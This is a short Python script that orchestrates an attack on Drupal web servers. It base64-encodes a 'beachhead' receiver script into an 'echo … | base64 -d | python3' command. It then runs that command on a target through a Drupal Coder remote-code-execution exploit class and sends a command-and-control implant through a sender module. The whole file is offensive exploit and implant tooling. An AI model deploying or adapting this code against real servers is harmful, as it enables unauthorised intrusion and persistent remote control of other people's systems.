from include.BeachheadSender import BeachheadSender
from include.DrupalCoderExec import DrupalCoderExec

from base64 import b64encode


BEACHHEAD_LOCATION = 'include/BeachheadReceiver.py'

def package_beachhead():
    with open(BEACHHEAD_LOCATION, 'r') as f:
        receiver = f.read()
    b64_beachhead = b64encode(receiver.encode('utf-8')).decode('utf-8')
    return "echo " + b64_beachhead + " | base64 -d | python3"

def implant_beachhead(ip_addr, port, path):
    beachhead = package_beachhead()
    exec = DrupalCoderExec(beachhead)
    exec.exploit(ip_addr, port, path)
    
def implant_cnc(ip_addr, port, path, implant_file_path):
    sender = BeachheadSender(ip_addr, port, path, implant_file_path)
    sender.send_request()